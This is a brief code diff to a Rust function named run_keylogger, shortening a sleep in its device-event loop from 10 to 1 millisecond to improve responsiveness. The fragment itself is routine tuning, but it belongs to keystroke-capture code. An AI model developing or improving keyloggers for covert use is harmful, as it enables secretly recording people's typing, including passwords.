@@ -112,7 +112,8 @@ pub fn run_keylogger(log_path: &str) {
                 }
                 Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                     // No events available, this is normal
-                    std::thread::sleep(std::time::Duration::from_millis(10));
+                    // Short sleep to prevent busy-waiting while maintaining responsiveness
+                    std::thread::sleep(std::time::Duration::from_millis(1));
                 }
                 Err(e) => {
                     eprintln!("Error reading events from {}: {}", device_name, e);
